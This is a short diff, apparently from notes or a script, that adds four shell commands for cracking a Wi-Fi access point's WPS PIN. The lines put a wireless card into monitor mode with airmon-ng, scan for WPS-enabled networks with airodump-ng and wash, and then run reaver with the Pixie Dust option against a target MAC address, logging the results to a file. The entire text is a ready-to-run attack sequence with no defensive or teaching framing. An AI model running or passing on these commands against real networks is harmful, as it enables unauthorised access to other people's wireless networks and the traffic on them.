@@ -1,0 +1,4 @@
+airmon-ng start wlan1
+airodump-ng --wps wlan1
+wash -c 6 -i wlan1mon # -c = channel, -i = interface
+/usr/local/bin/reaver -i wlan1mon -b <MAC ADDRESS> -vv -K 1 --no-nacks --win7 -o /home/user/<filename>.txt &
